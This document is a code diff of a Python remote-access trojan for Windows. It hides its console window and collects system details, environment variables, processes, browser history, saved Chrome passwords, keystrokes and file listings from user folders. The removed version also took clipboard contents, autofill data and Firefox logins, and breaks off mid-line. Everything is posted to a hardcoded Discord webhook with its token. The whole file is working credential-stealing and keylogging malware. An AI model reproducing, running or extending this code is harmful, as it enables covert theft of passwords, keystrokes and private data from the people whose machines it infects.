@@ -1,230 +1,222 @@
+import ctypes
 import os
 import socket
 import time
-import ctypes
 import subprocess
 import sqlite3
-import win32clipboard  # Only works on Windows
 import base64
-import shutil
+import http.client
+import json
+import pip
+import traceback
+import sys
+import win32gui
+import win32con
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1305485793971802166/n2d_kJ0Kosfoq6mttAz-Sr0I6_3xwlj0X1KTHFF9nDH8-0REHApjNnvng2xcugBZxlOd"  # Replace with your Discord webhook URL
+# Function to install missing libraries
+def install_libraries(libraries):
+    for library in libraries:
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
+        except subprocess.CalledProcessError as e:
+            print(f"Error installing {library}: {e}")
+
+# List of required libraries
+required_libraries = ['requests', 'pywin32', 'sqlite3', 'pynput']
+
+# Install necessary libraries before executing
+install_libraries(required_libraries)
+
+# Function to hide the command prompt window
+def hide_console():
+    try:
+        # Get the current window (the command prompt window)
+        window = win32gui.GetForegroundWindow()
+        # Hide the window
+        win32gui.ShowWindow(window, win32con.SW_HIDE)
+    except Exception as e:
+        print(f"Error hiding console: {str(e)}")
 
 # Function to send data to the Discord webhook
 def send_to_discord(message):
     try:
-        import urllib.request
-        req = urllib.request.Request(WEBHOOK_URL, data=message.encode('utf-8'))
-        req.add_header('Content-Type', 'application/json')
-        urllib.request.urlopen(req)
-    except:
-        pass
+        webhook_url = "https://discord.com/api/webhooks/1305485793971802166/n2d_kJ0Kosfoq6mttAz-Sr0I6_3xwlj0X1KTHFF9nDH8-0REHApjNnvng2xcugBZxlOd"
+        conn = http.client.HTTPSConnection("discord.com")
+        headers = {'Content-Type': 'application/json'}
+        payload = json.dumps({"content": message})
+        conn.request("POST", "/api/webhooks/1305485793971802166/n2d_kJ0Kosfoq6mttAz-Sr0I6_3xwlj0X1KTHFF9nDH8-0REHApjNnvng2xcugBZxlOd", body=payload, headers=headers)
+        response = conn.getresponse()
+        conn.close()
+    except Exception as e:
+        print(f"Error sending to Discord: {e}")
+        send_to_discord(f"Error: {str(e)}")  # Send error message to Discord for logging
 
-# Function to capture system information
+# Function to collect system info
 def get_system_info():
-    system_info = f"Machine: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
-    system_info += f"OS: {os.name}\n"
-    system_info += f"IP Address: {socket.gethostbyname(socket.gethostname())}\n"
-    return system_info
+    try:
+        system_info = f"Machine: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
+        system_info += f"OS: {os.name}\n"
+        system_info += f"IP Address: {socket.gethostbyname(socket.gethostname())}\n"
+        return system_info
+    except Exception as e:
+        return f"Error collecting system info: {str(e)}"
 
-# Function to capture environment variables
+# Function to collect environment variables
 def get_env_vars():
-    env_vars = "\nEnvironment Variables:\n"
-    for key, value in os.environ.items():
-        env_vars += f"{key}: {value}\n"
-    return env_vars
+    try:
+        env_vars = "\nEnvironment Variables:\n"
+        for key, value in os.environ.items():
+            env_vars += f"{key}: {value}\n"
+        return env_vars
+    except Exception as e:
+        return f"Error collecting environment variables: {str(e)}"
 
-# Function to capture running processes
+# Function to collect running processes
 def get_processes():
     try:
         processes = "\nRunning Processes:\n"
         output = subprocess.check_output('tasklist', shell=True)
         processes += output.decode('utf-8')
         return processes
-    except:
-        return "\nFailed to get processes."
-
-# Function to capture clipboard content (Windows only)
-def get_clipboard():
-    clipboard_content = ""
-    try:
-        win32clipboard.OpenClipboard()
-        clipboard_content = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
-        return f"\nClipboard content: {clipboard_content}"
-    except:
-        return "\nFailed to get clipboard."
+    except Exception as e:
+        return f"Error collecting processes: {str(e)}"
 
 # Function to collect AppData files
 def get_appdata():
-    appdata_folder = os.environ.get('APPDATA', 'Unknown')
-    appdata_content = f"\nAppData Content in {appdata_folder}:\n"
     try:
+        appdata_folder = os.environ.get('APPDATA', 'Unknown')
+        appdata_content = f"\nAppData Content in {appdata_folder}:\n"
         for root, dirs, files in os.walk(appdata_folder):
             for file in files:
                 if file.endswith(".txt") or file.endswith(".log"):  # Targeting text or log files
                     appdata_content += f"{file}: {os.path.join(root, file)}\n"
         return appdata_content
     except Exception as e:
-        return f"\nError reading AppData: {str(e)}"
+        return f"Error reading AppData: {str(e)}"
 
-# Function to collect browser history, passwords, and autofill data from Chrome and Firefox
+# Function to collect browser data (including Chrome and Firefox history)
 def get_browser_data():
-    browser_data = "\nBrowser Data (History, Passwords, Autofill):\n"
+    try:
+        browser_data = "\nBrowser Data (History, Passwords):\n"
 
-    # Collect Chrome Data
-    chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google\\Chrome\\User Data\\Default')
-    if os.path.exists(chrome_path):
-        browser_data += f"\nChrome Data (SQLite DBs):\n"
-        
-        # Collect Chrome History
-        history_path = os.path.join(chrome_path, 'History')
-        if os.path.exists(history_path):
-            try:
-                conn = sqlite3.connect(history_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT url, title, last_visit_time FROM urls")
-                browser_data += "\nHistory:\n"
-                for row in cursor.fetchall():
-                    browser_data += f"URL: {row[0]}, Title: {row[1]}, Last Visited: {row[2]}\n"
-                conn.close()
-            except Exception as e:
-                browser_data += f"Error reading Chrome history: {str(e)}\n"
-
-        # Collect Chrome Passwords (if any)
-        passwords_path = os.path.join(chrome_path, 'Login Data')
-        if os.path.exists(passwords_path):
-            try:
-                conn = sqlite3.connect(passwords_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
-                browser_data += "\nSaved Passwords:\n"
-                for row in cursor.fetchall():
-                    decrypted_password = base64.b64encode(row[3]).decode('utf-8')  # Decrypting password (not safe)
-                    browser_data += f"URL: {row[0]}, Username: {row[2]}, Password: {decrypted_password}\n"
-                conn.close()
-            except Exception as e:
-                browser_data += f"Error reading Chrome passwords: {str(e)}\n"
-
-        # Collect Chrome Autofill Data
-        autofill_path = os.path.join(chrome_path, 'Web Data')
-        if os.path.exists(autofill_path):
-            try:
-                conn = sqlite3.connect(autofill_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT name, value FROM autofill")
-                browser_data += "\nAutofill Data:\n"
-                for row in cursor.fetchall():
-                    browser_data += f"Name: {row[0]}, Value: {row[1]}\n"
-                conn.close()
-            except Exception as e:
-                browser_data += f"Error reading Chrome autofill data: {str(e)}\n"
-
-    # Collect Firefox Data
-    firefox_path = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla\\Firefox\\Profiles')
-    if os.path.exists(firefox_path):
-        browser_data += f"\nFirefox Data (SQLite DBs):\n"
-        
-        # Collect Firefox History
-        for profile in os.listdir(firefox_path):
-            profile_path = os.path.join(firefox_path, profile, 'places.sqlite')
-            if os.path.exists(profile_path):
+        # Collect Chrome Data
+        chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google\\Chrome\\User Data\\Default')
+        if os.path.exists(chrome_path):
+            browser_data += f"\nChrome Data (SQLite DBs):\n"
+            
+            # Collect Chrome History
+            history_path = os.path.join(chrome_path, 'History')
+            if os.path.exists(history_path):
                 try:
-                    conn = sqlite3.connect(profile_path)
+                    conn = sqlite3.connect(history_path)
                     cursor = conn.cursor()
-                    cursor.execute("SELECT url, title, datetime(visit_date/1000000,'unixepoch') FROM moz_places")
+                    cursor.execute("SELECT url, title, last_visit_time FROM urls")
                     browser_data += "\nHistory:\n"
                     for row in cursor.fetchall():
                         browser_data += f"URL: {row[0]}, Title: {row[1]}, Last Visited: {row[2]}\n"
                     conn.close()
                 except Exception as e:
-                    browser_data += f"Error reading Firefox history: {str(e)}\n"
+                    browser_data += f"Error reading Chrome history: {str(e)}\n"
 
-        # Collect Firefox Passwords
-        for profile in os.listdir(firefox_path):
-            profile_path = os.path.join(firefox_path, profile, 'logins.json')
-            if os.path.exists(profile_path):
-                try:
-                    with open(profile_path, 'r') as f:
-                        logins = json.load(f)
-                        browser_data += "\nSaved Passwords:\n"
-                        for login in logins.get('logins', []):
-                            browser_data += f"URL: {login.get('hostname')}, Username: {login.get('username')}, Password: {login.get('password')}\n"
-                except Exception as e:
-                    browser_data += f"Error reading Firefox passwords: {str(e)}\n"
+        # Collect Firefox Data
+        firefox_path = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla\\Firefox\\Profiles')
+        if os.path.exists(firefox_path):
+            browser_data += f"\nFirefox Data (SQLite DBs):\n"
+            
+            # Collect Firefox History
+            for profile in os.listdir(firefox_path):
+                profile_path = os.path.join(firefox_path, profile, 'places.sqlite')
+                if os.path.exists(profile_path):
+                    try:
+                        conn = sqlite3.connect(profile_path)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT url, title, datetime(visit_date/1000000,'unixepoch') FROM moz_places")
+                        browser_data += "\nHistory:\n"
+                        for row in cursor.fetchall():
+                            browser_data += f"URL: {row[0]}, Title: {row[1]}, Last Visited: {row[2]}\n"
+                        conn.close()
+                    except Exception as e:
+                        browser_data += f"Error reading Firefox history: {str(e)}\n"
 
-    return browser_data
+        return browser_data
+    except Exception as e:
+        return f"Error collecting browser data: {str(e)}"
 
 # Function to capture keystrokes (Windows only)
 def capture_keystrokes():
-    keystrokes = "\nKeystrokes:\n"
-    while True:
-        key = ctypes.windll.user32.GetAsyncKeyState
-        for i in range(0, 255):
-            if key(i) < 0:
-                keystrokes += chr(i)
-        time.sleep(0.1)
-        if len(keystrokes) > 0:
-            send_to_discord(keystrokes)
-            break
+    try:
+        keystrokes = "\nKeystrokes:\n"
+        max_keystrokes = 100  # Limit keystrokes
+        captured = 0
+        while captured < max_keystrokes:
+            key = ctypes.windll.user32.GetAsyncKeyState
+            for i in range(0, 255):
+                if key(i) < 0:
+                    keystrokes += chr(i)
+                    captured += 1
+            time.sleep(0.1)
+        send_to_discord(keystrokes)
+    except Exception as e:
+        send_to_discord(f"Error capturing keystrokes: {str(e)}")
 
-# Function to collect the Documents, Downloads, Videos, and Pictures folders
+# Function to collect Documents, Downloads, Pictures, and Videos folders
 def collect_folders():
-    # List of target folders
-    target_folders = [
-        os.path.join(os.environ['USERPROFILE'], 'Documents'),
-        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
-        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
-        os.path.join(os.environ['USERPROFILE'], 'Videos')
-    ]
-    
-    collected_data = ""
-    for folder in target_folders:
-        if os.path.exists(folder):
-            collected_data += f"\nFiles in {folder}:\n"
-            for root, dirs, files in os.walk(folder):
-                for file in files:
-                    collected_data += f"{file}: {os.path.join(root, file)}\n"
-        else:
-            collected_data += f"\n{folder} not found.\n"
-    
-    return collected_data
+    try:
+        target_folders = [
+            os.path.join(os.environ['USERPROFILE'], 'Documents'),
+            os.path.join(os.environ['USERPROFILE'], 'Downloads'),
+            os.path.join(os.environ['USERPROFILE'], 'Pictures'),
+            os.path.join(os.environ['USERPROFILE'], 'Videos')
+        ]
+        
+        collected_data = ""
+        for folder in target_folders:
+            if os.path.exists(folder):
+                collected_data += f"\nFiles in {folder}:\n"
+                for root, dirs, files in os.walk(folder):
+                    for file in files:
+                        collected_data += f"{file}: {os.path.join(root, file)}\n"
+            else:
+                collected_data += f"\n{folder} not found.\n"
+        
+        return collected_data
+    except Exception as e:
+        return f"Error collecting folders: {str(e)}"
 
 # Main function to run the RAT
 def start_rat():
-    # Collect system info
-    system_info = get_system_info()
-    send_to_discord(f"System Info:\n{system_info}")
-    
-    # Collect environment variables
-    env_vars = get_env_vars()
-    send_to_discord(env_vars)
-    
-    # Collect running processes
-    processes = get_processes()
-    send_to_discord(processes)
-    
-    # Collect clipboard content
-    clipboard_content = get_clipboard()
-    send_to_discord(clipboard_content)
-    
-    # Collect AppData files
-    appdata_content = get_appdata()
-    send_to_discord(appdata_content)
-    
-    # Collect browser data (history, passwords, autofill)
-    browser_data = get_browser_data()
-    send_to_discord(browser_data)
-    
-    # Collect the Documents, Downloads, Videos, and Pictures folders
-    folder_data = collect_folders()
-    send_to_discord(folder_data)
-    
-    # Capture keystrokes (in background)
-    capture_keystrokes()
+    try:
+        # Collect system info
+        system_info = get_system_info()
+        send_to_discord(f"System Info:\n{system_info}")
+        
+        # Collect environment variables
+        env_vars = get_env_vars()
+        send_to_discord(env_vars)
+        
+        # Collect running processes
+        processes = get_processes()
+        send_to_discord(processes)
+        
+        # Collect AppData files
+        appdata = get_appdata()
+        send_to_discord(appdata)
+        
+        # Collect browser data
+        browser_data = get_browser_data()
+        send_to_discord(browser_data)
+        
+        # Capture keystrokes
+        capture_keystrokes()
+        
+        # Collect folder data
+        folder_data = collect_folders()
+        send_to_discord(folder_data)
+    except Exception as e:
+        send_to_discord(f"Error starting RAT: {str(e)}")
 
-# Run the RAT
-if __name__ == "__main__":
-    while True:
-        start_rat()
-        time.sleep(
+# Hide the command prompt
+hide_console()
+
+# Start the RAT
+start_rat()
